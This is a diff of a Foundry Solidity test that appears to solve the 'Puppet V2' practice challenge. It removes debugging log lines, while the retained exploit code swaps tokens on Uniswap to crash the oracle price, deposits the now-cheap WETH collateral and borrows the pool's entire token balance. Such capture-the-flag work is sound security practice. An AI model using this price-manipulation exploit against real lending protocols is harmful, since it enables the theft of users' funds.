@@ -125,15 +125,6 @@ contract PuppetV2 is Test {
         tokenAddresses[0] = address(dvt);
         tokenAddresses[1] = address(weth);
 
-        // Finally, you can use the getAmountsOut function to get the weth amount
-        uint256[] memory array = uniswapV2Router.getAmountsOut(
-            1000e18,
-            tokenAddresses
-        );
-        console.log(array[0] / 1 ether);
-        console.log(array[1] / 1 ether);
-        
-        
         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
             ATTACKER_INITIAL_TOKEN_BALANCE,
             0,
@@ -145,12 +136,12 @@ contract PuppetV2 is Test {
         uint256 bait = puppetV2Pool.calculateDepositOfWETHRequired(
             POOL_INITIAL_TOKEN_BALANCE
         );
-        console.log(bait / 1 ether);
-        weth.deposit{ value: bait }();
+        
+        weth.deposit{value: bait}();
         weth.approve(address(puppetV2Pool), type(uint256).max);
         puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
         vm.stopPrank();
-        
+
         /** EXPLOIT END **/
         validation();
     }
